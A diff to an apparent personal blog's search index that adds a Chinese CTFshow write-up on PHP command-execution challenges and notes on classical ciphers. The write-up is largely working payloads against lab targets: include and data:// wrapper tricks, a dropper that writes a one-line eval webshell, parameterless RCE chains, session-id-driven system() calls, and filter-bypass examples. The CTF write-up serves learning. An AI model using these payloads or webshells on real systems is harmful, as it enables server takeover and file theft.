@@ -193,7 +193,7 @@
 <p>${printf,”\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76”} &gt;&gt; 1.php</p>
 <p>3.单引号和双引号绕过<br>c’a’t test<br>c”a”t test</p>
 <p>4.反斜杠绕过<br>ca\t test</p>
-<p>5.通过$PATH绕过<br>#echo $PATH 显示当前PATH环境变量，该变量的值由一系列以冒号分隔的目录名组成</p>
+<p>5.通过$PATH绕过<br>#echo  $PATH 显示当前PATH环境变量，该变量的值由一系列以冒号分隔的目录名组成</p>
 <p>#当执行程序时，shell自动跟据PATH变量的值去搜索该程序</p>
 <p>#shell在搜索时先搜索PATH环境变量中的第一个目录，没找到再接着搜索，如果找到则执行它，不会再继续搜索</p>
 <p>echo $PATH</p>
@@ -526,5 +526,196 @@
     <title>XSS_WEBGOAT</title>
     <url>/2022/04/28/XSS-WEBGOAT/</url>
     <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>CTFSHOW_web32-33命令执行</title>
+    <url>/2022/04/29/CTFSHOW-web32%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[<p>code:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一次见过滤分号的，而且是eval。eval函数将传入的字符串当作php代码执行，而我们都知道php代码不以分号结尾会报错，所以我卡住了。看提示是</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$nice</span>=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]<span class="meta">?&gt;</span>&amp;url=php:<span class="comment">//filter/read=convert.base64-</span></span><br><span class="line">encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>太惊讶了，还有这种包含方式？说实话不理解其中原理，只能硬记下来。 <strong>php中include是可以不带括号的函数</strong> </p>
+<p>试试php:&#x2F;&#x2F;input伪协议上传一句话木马</p>
+<p>url传参：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="variable">$nice</span>=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]<span class="meta">?&gt;</span>&amp;url=php:<span class="comment">//input</span></span><br></pre></td></tr></table></figure>
+
+<p>post传数据:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[v]);?&gt;&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接获取webshell！</p>
+<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p>跟上一题相比就多过滤了一个双引号，payload:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="variable">$nice</span>=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p>code:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>多过滤了:  payload跟33题一样。。</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$nice=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>code:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>太搞了吧？过滤了&#x3D;号，然而有啥用</p>
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>code:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>不允许出现数字，还是老payload，简单改一改。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>所以说，是要告诉我们GET传参可以不用加单引号 双引号是吗？</p>
+<h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><p>code：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c);</span><br><span class="line">        echo $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>终于换题目了。。。</p>
+<p>尝试php:&#x2F;&#x2F;input写shell</p>
+<p>url中传入?c&#x3D;php:&#x2F;&#x2F;input</p>
+<p>post传参</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[v]);?&gt;&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功访问，直接拿flag。这题目应该一直打开着allow</p>
+<p>喔，官方题解是</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span></span><br></pre></td></tr></table></figure>
+
+<p>嗯，用data伪协议达到执行php代码的效果。</p>
+<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p>code:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>用不了php:&#x2F;&#x2F;input伪协议了，只能用data，跟上题一样的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain,;base64,base64的php代码</span><br></pre></td></tr></table></figure>
+
+<p>如</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><p>学到了这题。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>尝试%00截断失败了，看提示还是data伪协议，<img src="/../images/1651220785981.png" alt="1651220785981"></p>
+<p>payload:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,&lt;?php system(&#x27;cat flag.php&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p>code:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题真的学到了。题目小心机，过滤的括号是中文的，实际上英文的括号没有被过滤。</p>
+<p>但是单双引号 + 双斜杠被过滤了，导致前面的payload都不好使了。只能无参数RCE。</p>
+<p>提示说的是GXYCTF禁止套娃，让我们去看看那道题吧。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">          </span><br><span class="line">      </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>跟本题真的很像了，过滤了各种php伪协议，第二个if有点难看懂。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;]))</span><br></pre></td></tr></table></figure>
+
+<p>?R是引用当前表达式，后面再加上?形成递归调用。</p>
+<p> 也就是说，这里这种代码才能通过匹配 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a();</span><br><span class="line">a(b(c()));</span><br><span class="line">像下面的这种是不可以的,典型的无参数RCE。：a(&quot;123&quot;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。</span><br><span class="line">2.过滤了常用的几个伪协议，不能以伪协议读取文件。</span><br><span class="line">3.(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。</span><br><span class="line">4.正则匹配掉了et/na/info等关键字，很多函数都用不了。</span><br><span class="line">5：eval($_GET[&#x27;exp&#x27;]); 典型的无参数RCE</span><br></pre></td></tr></table></figure>
+
+<p>但是无参数如何通过eval执行系统命令拿flag呢？</p>
+<p>可以通过一些无参的函数作为有参函数的参数来实现。</p>
+<h3 id="3-1-print-r"><a href="#3-1-print-r" class="headerlink" title="3.1 print_r()"></a>3.1 print_r()</h3><p>读取文件函数，相似的函数还有：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpfile_get_content()</span><br><span class="line">readfile()</span><br><span class="line">highlight_file()</span><br><span class="line">show_source()</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-localeconv"><a href="#3-2-localeconv" class="headerlink" title="3.2 localeconv()"></a>3.2 localeconv()</h3><p>返回一个包含本地数字及货币格式信息的数组。</p>
+<h3 id="3-4-current-x2F-pos"><a href="#3-4-current-x2F-pos" class="headerlink" title="3.4 current()&#x2F;pos()"></a>3.4 current()&#x2F;pos()</h3><p>返回数组中的当前单元，默认取第一个值。</p>
+<h3 id="3-4-scandir"><a href="#3-4-scandir" class="headerlink" title="3.4 scandir()"></a>3.4 scandir()</h3><p>列出目录中的文件和目录 。</p>
+<h3 id="3-5-next"><a href="#3-5-next" class="headerlink" title="3.5 next()"></a>3.5 next()</h3><p>该函数将内部指针指向数组中的下一个元素并输出。</p>
+<h3 id="3-6-end"><a href="#3-6-end" class="headerlink" title="3.6 end()"></a>3.6 end()</h3><p>取数组的最后一项，数组指针指向下一位。</p>
+<h3 id="3-7-array-reverse"><a href="#3-7-array-reverse" class="headerlink" title="3.7 array_reverse()"></a>3.7 array_reverse()</h3><p>以相反的元素返回数组，将数组颠倒。</p>
+<h3 id="3-8-array-rand"><a href="#3-8-array-rand" class="headerlink" title="3.8 array_rand()"></a>3.8 array_rand()</h3><p>随机返回数组的键名。</p>
+<h3 id="3-9-array-flip"><a href="#3-9-array-flip" class="headerlink" title="3.9 array_flip()"></a>3.9 array_flip()</h3><p>交换数组的键和值。</p>
+<h3 id="3-10-highlight-file"><a href="#3-10-highlight-file" class="headerlink" title="3.10 highlight_file()"></a>3.10 highlight_file()</h3><p>打印输出或者返回filename文件中语法高亮版本的代码。</p>
+<p>3.11 pos()</p>
+<p>返回数组中的当前元素的值</p>
+<p>所以禁止套娃这一题的payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(scandir(pos(localeconv())));   //查看当前目录文件下的存在的数组</span><br></pre></td></tr></table></figure>
+
+<p>分析一下这个payload：</p>
+<p>1）localeconv返回一个包含本地数字及货币格式信息的数组。<img src="/../images/1651227195953.png" alt="1651227195953"></p>
+<p>第一个就是点！！</p>
+<p>然后pos函数取得数组的值<img src="/../images/1651227244289.png" alt="1651227244289"></p>
+<p>发现了吧，最终scandir函数的参数是点，点代表的就是当前目录，所以scandir列出了当前目录下的文件和目录！</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readfile(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p>将数组颠倒，这样flag.php位于数组第二个位置，然后next函数之后指针指向了flag.php所在位置，最后直接读文件！</p>
+<p>这样也可以</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure>
+
+<p>但是第一个payload在ctfshow这题居然不行，第二个才可以。但是为什么报同样的警告一个可以执行一个不行？</p>
+<p>上面的太麻烦了，还有更简单的。通过php的session_id(session_start())</p>
+<p>这道题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。使用session之前需要通过session_start()告诉PHP使用session，php默认的是不主动使用session的，session_id()可以获取当前的session_id。</p>
+<p>所以我们手动设置名为PHPSESSID的cookie，并设置为flag.php。</p>
+<p><img src="/../images/1651227949187.png" alt="1651227949187"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">session_start</span>();<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">session_id</span>()));</span><br></pre></td></tr></table></figure>
+
+<p>传入session_id&#x3D;ls，所以执行system(‘ls’) 。</p>
+<p>总结：无参数RCE &#x3D;&gt; 寻找无参数函数作为有参数函数的参数 或者 通过php的sessionid</p>
+<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><p>code：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>字母数字都没了。已经蚌埠住了….</p>
+<p>果断看提示: 发现是或运算符。</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>密码学原理与实践笔记</title>
+    <url>/2022/05/02/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="密码学原理与实践笔记"><a href="#密码学原理与实践笔记" class="headerlink" title="密码学原理与实践笔记"></a>密码学原理与实践笔记</h1><h2 id="第1章-古典密码学"><a href="#第1章-古典密码学" class="headerlink" title="第1章 古典密码学"></a>第1章 古典密码学</h2><h3 id="1-1-几个简单的密码体制"><a href="#1-1-几个简单的密码体制" class="headerlink" title="1.1 几个简单的密码体制"></a>1.1 几个简单的密码体制</h3><p><img src="/../images/1651474676178-1651475210782.png" alt="1651474676178"></p>
+<p>$\varepsilon$的含义书中没有给出具体说明，但是应该是一个由多个映射组成的集合，我称它为加密映射集合。$e_k \in$ $\varepsilon$, $e_k$是一个从P-&gt;C的单射，同理D是解密映射集合。加密映射跟解密映射满足这么一种条件：对于属于明文集合的某个元素x来说，在加密映射之后得到的结果在经过一个解密映射之后可以恢复出x​</p>
+<p>$e_k$至少需要是一个单射是因为必须保证不同的明文加密之后得到的两个密文不能相同，否则会让接收者无法分辨此密文对应那个明文。当明文集合P跟密文集合C相同的时候，从P到C的映射就是从P到P的映射，这显然是一个P上的变换，凯撒密码显然就是这样的例子。</p>
+<h4 id="1-1-1-移位密码-Shift-Cipher"><a href="#1-1-1-移位密码-Shift-Cipher" class="headerlink" title="1.1.1 移位密码(Shift Cipher)"></a>1.1.1 移位密码(Shift Cipher)</h4><p>移位密码的基础就是数论中的模运算。</p>
+<p><img src="/../images/1651475158151-1651475210783.png" alt="1651475158151"></p>
+<p>书中规定a mod m 恒为非负值，这跟在计算机中实际运算不同。</p>
+<p><img src="/../images/1651475288286.png" alt="1651475288286"></p>
+<p><img src="/../images/1651475314153.png" alt="1651475314153"></p>
+<p><img src="/../images/1651475348680.png" alt="1651475348680"></p>
+<p>显然地，$Z_m$对加法构成一个交换加群，也就是阿贝尔群。对于乘法来说满足封闭性 结合律 有单位元 交换律。所以$Z_m$至少是一个有单位元的交换环，本书所关心的环均是有限环。</p>
+<p><img src="/../images/1651475471282.png" alt="1651475471282"></p>
+<p><img src="/../images/1651475509990.png" alt="1651475509990"></p>
+<p>观察移位密码的定义，发现明文集合&#x3D;密文集合&#x3D;密钥集合，三个集合都由26个数字&#x2F;字母组成。还定义了其上的加密映射跟解密映射 $e_k,d_k$</p>
+<p>凯撒加密特别简单，将你要加密的英文句子中的所有字母都变换为0-25之间的数字，具体地说按顺序将a变为0，b变为1，以此类推。<img src="/../images/1651475654751.png" alt="1651475654751"></p>
+<p>将所有字母变为数字之后，再根据加密映射的K对数字进行模26的加法，具体地说就是(数字+K)mod26 &#x3D; 密文数字</p>
+<p>实例：</p>
+<p><img src="/../images/1651475786061.png" alt="1651475786061"></p>
+<p>解密过程跟加密过程很类似，不多叙述。</p>
+<p><img src="/../images/1651475869571.png" alt="1651475869571"></p>
+<p>凯撒密码显然是很脆弱的密码，这取决于它的密钥空间太小了。一个密码体制安全的必要条件是能抵抗穷尽密钥搜索攻击，普通的做法是使密钥空间足够大，但是很大的密钥空间并不是保证密码体制安全的充分条件。</p>
+<h3 id="1-1-2-代换密码-Substitution-Cipher"><a href="#1-1-2-代换密码-Substitution-Cipher" class="headerlink" title="1.1.2 代换密码(Substitution Cipher)"></a>1.1.2 代换密码(Substitution Cipher)</h3><p><img src="/../images/1651476026570.png" alt="1651476026570"></p>
+<p><img src="/../images/1651476119118.png" alt="1651476119118"><img src="/../images/1651476147178.png" alt="1651476147178"></p>
+<p>很容易的发现代换密码跟凯撒密码的区别，代换密码对全体的明文集合都定义了一个不同的加密映射，而对于凯撒密码来说，当K确定之后，所有的明文集合转为数字之后都加上K然后变为密文，所以凯撒密码是全体明文集合定义了一个共同的加密映射。</p>
+<p><img src="/../images/1651476266385.png" alt="1651476266385"></p>
+<p>代换密码一个密钥有26种可能的英文字母对应，总共的置换有26的阶乘种，因为加密映射是把一个字母变为字母表上另一个字母，第一个字母有26种可能，第二个字母有25种，以此类推，一共有26个字母要映射。所以总置换数&#x3D;$26<em>25</em>24<em>23</em>*****1&#x3D;26!$</p>
+<p>解密上面的密文代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alpha = <span class="string">&#x27;XNYAHPOGZQWBTSFLRCVMUEKJDI&#x27;</span><span class="comment">#加密映射表</span></span><br><span class="line">alpha1 = <span class="string">&#x27;dlryvohezxwptbgfjqnmuskaci&#x27;</span><span class="comment">#解密映射表</span></span><br><span class="line">cipher = <span class="string">&#x27;MGZVYZLGHCMHJMYXSSFMNHAHYCDLMHA&#x27;</span></span><br><span class="line"><span class="built_in">dict</span>   = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher,alpha1</span>):</span><br><span class="line">    plain = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">        index = <span class="built_in">dict</span>.index(i)</span><br><span class="line">        plain+=alpha1[index]</span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypt(cipher,alpha1))</span><br></pre></td></tr></table></figure>
+
+<p>明文：thisciphertextcannotbedecrypted</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
   </entry>
 </search>
